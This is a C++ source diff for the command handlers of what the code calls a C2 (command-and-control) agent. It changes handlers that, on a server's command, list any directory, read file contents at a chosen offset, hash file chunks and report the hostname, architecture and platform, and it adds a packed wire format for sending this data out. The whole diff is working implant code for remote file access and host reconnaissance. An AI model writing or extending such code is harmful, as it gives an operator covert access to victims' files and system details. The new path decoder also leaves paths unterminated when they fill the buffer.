@@ -2,13 +2,73 @@
 #include "memory.h"
 #include "file.h"
 #include "directory_iterator.h"
+#include "path.h"
 #include "string.h"
 #include "math.h"
 #include "logger.h"
 #include "sha2.h"
-#include "uuid.h"
 #include "vector.h"
-#include "machine_id.h"
+#include "system_info.h"
+
+// =============================================================================
+// Wire-format directory entry — fixed layout matching the C2 server protocol.
+// Uses CHAR16 (always 2 bytes) instead of WCHAR (2 bytes on Windows, 4 on Linux)
+// so that sizeof(WireDirectoryEntry) is identical on every platform.
+// =============================================================================
+
+#pragma pack(push, 1)
+struct WireDirectoryEntry
+{
+    CHAR16 Name[256];        ///< UTF-16LE file/directory name
+    UINT64 CreationTime;
+    UINT64 LastModifiedTime;
+    UINT64 Size;
+    UINT32 Type;
+    BOOL IsDirectory;
+    BOOL IsDrive;
+    BOOL IsHidden;
+    BOOL IsSystem;
+    BOOL IsReadOnly;
+};
+#pragma pack(pop)
+
+/// Convert a native DirectoryEntry to the wire-format WireDirectoryEntry
+static VOID ToWireEntry(const DirectoryEntry &src, WireDirectoryEntry &dst)
+{
+    StringUtils::WideToChar16(
+        Span<const WCHAR>(src.Name, StringUtils::Length(src.Name)),
+        Span<CHAR16>(dst.Name, 256));
+    dst.CreationTime = src.CreationTime;
+    dst.LastModifiedTime = src.LastModifiedTime;
+    dst.Size = src.Size;
+    dst.Type = src.Type;
+    dst.IsDirectory = src.IsDirectory;
+    dst.IsDrive = src.IsDrive;
+    dst.IsHidden = src.IsHidden;
+    dst.IsSystem = src.IsSystem;
+    dst.IsReadOnly = src.IsReadOnly;
+}
+
+/// Decode a CHAR16 path from the wire protocol into a native WCHAR path.
+/// Normalizes path separators to the platform convention (e.g. '\' → '/' on Linux).
+static USIZE DecodeWirePath(PCHAR command, WCHAR *widePath, USIZE widePathSize)
+{
+    PCCHAR16 wirePath = (PCCHAR16)(command);
+    USIZE wireLen = 0;
+    while (wirePath[wireLen] != 0)
+        wireLen++;
+    USIZE len = StringUtils::Char16ToWide(
+        Span<const CHAR16>(wirePath, wireLen),
+        Span<WCHAR>(widePath, widePathSize));
+
+    // Normalize separators so that Windows-style '\' paths work on Linux
+    for (USIZE i = 0; i < len; ++i)
+    {
+        if (widePath[i] == L'\\' || widePath[i] == L'/')
+            widePath[i] = (WCHAR)PATH_SEPARATOR;
+    }
+    return len;
+}
 
 static VOID WriteErrorResponse(PPCHAR response, PUSIZE responseLength, StatusCode code)
 {
@@ -22,26 +82,10 @@ static BOOL IsDotEntry(const DirectoryEntry &entry)
            StringUtils::Equals((PWCHAR)entry.Name, (const WCHAR *)L".."_embed);
 }
 
-VOID Handle_GetUUIDCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength)
-{
-    auto result = GetMachineUUID();
-    if (!result.IsOk())
-    {
-        LOG_ERROR("Failed to retrieve machine UUID from OS");
-        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
-        return;
-    }
-
-    UUID uuid = result.Value();
-    *responseLength += sizeof(UUID);
-    *response = new CHAR[*responseLength];
-    *(PUINT32)*response = StatusCode::StatusSuccess;
-    Memory::Copy(*response + sizeof(UINT32), &uuid, sizeof(UUID));
-}
-
 VOID Handle_GetDirectoryContentCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength)
 {
-    PWCHAR directoryPath = (PWCHAR)(command);
+    WCHAR directoryPath[1024];
+    DecodeWirePath(command, directoryPath, 1024);
     LOG_INFO("Getting directory content for path: %ws", directoryPath);
 
     auto result = DirectoryIterator::Create(directoryPath);
@@ -77,19 +121,27 @@ VOID Handle_GetDirectoryContentCommand([[maybe_unused]] PCHAR command, [[maybe_u
     }
 
     UINT64 entryCount = (UINT64)entries.Count;
-    *responseLength = sizeof(UINT32) + sizeof(UINT64) + (USIZE)(entryCount * sizeof(DirectoryEntry));
+    *responseLength = sizeof(UINT32) + sizeof(UINT64) + (USIZE)(entryCount * sizeof(WireDirectoryEntry));
     *response = new CHAR[*responseLength];
 
     *(PUINT32)*response = StatusCode::StatusSuccess;
     Memory::Copy(*response + sizeof(UINT32), &entryCount, sizeof(UINT64));
-    Memory::Copy(*response + sizeof(UINT32) + sizeof(UINT64), entries.Data, (USIZE)(entryCount * sizeof(DirectoryEntry)));
+
+    WireDirectoryEntry *wireEntries = (WireDirectoryEntry *)(*response + sizeof(UINT32) + sizeof(UINT64));
+    for (UINT64 i = 0; i < entryCount; i++)
+    {
+        Memory::Zero(&wireEntries[i], sizeof(WireDirectoryEntry));
+        ToWireEntry(entries.Data[i], wireEntries[i]);
+    }
 }
 
 VOID Handle_GetFileContentCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength)
 {
     UINT64 readCount = *(PUINT64)(command);
     UINT64 offset = *(PUINT64)(command + sizeof(UINT64));
-    PWCHAR filePath = (PWCHAR)(command + sizeof(UINT64) + sizeof(UINT64));
+
+    WCHAR filePath[1024];
+    DecodeWirePath(command + sizeof(UINT64) + sizeof(UINT64), filePath, 1024);
     LOG_INFO("Getting file content for path: %ws", filePath);
 
     auto openResult = File::Open(filePath, File::ModeRead);
@@ -117,7 +169,9 @@ VOID Handle_GetFileChunkHashCommand([[maybe_unused]] PCHAR command, [[maybe_unus
 {
     UINT64 chunkSize = *(PUINT64)(command);
     UINT64 offset = *(PUINT64)(command + sizeof(UINT64));
-    PWCHAR filePath = (PWCHAR)(command + sizeof(UINT64) + sizeof(UINT64));
+
+    WCHAR filePath[1024];
+    DecodeWirePath(command + sizeof(UINT64) + sizeof(UINT64), filePath, 1024);
     LOG_INFO("Getting file chunk hash for path: %ws", filePath);
 
     auto openResult = File::Open(filePath, File::ModeRead);
@@ -158,4 +212,19 @@ VOID Handle_GetFileChunkHashCommand([[maybe_unused]] PCHAR command, [[maybe_unus
     *(PUINT32)*response = StatusCode::StatusSuccess;
     Memory::Copy(*response + sizeof(UINT32), digest, SHA256_DIGEST_SIZE);
     LOG_INFO("File chunk hash computed successfully for %llu bytes read", totalRead);
+}
+
+VOID Handle_GetSystemInfoCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength)
+{
+    LOG_INFO("Getting system info");
+
+    SystemInfo info;
+    GetSystemInfo(&info);
+
+    *responseLength = sizeof(UINT32) + sizeof(SystemInfo);
+    *response = new CHAR[*responseLength];
+    *(PUINT32)*response = StatusCode::StatusSuccess;
+    Memory::Copy(*response + sizeof(UINT32), &info, sizeof(SystemInfo));
+
+    LOG_INFO("System info: hostname=%s, arch=%s, platform=%s", info.Hostname, info.Architecture, info.Platform);
 }
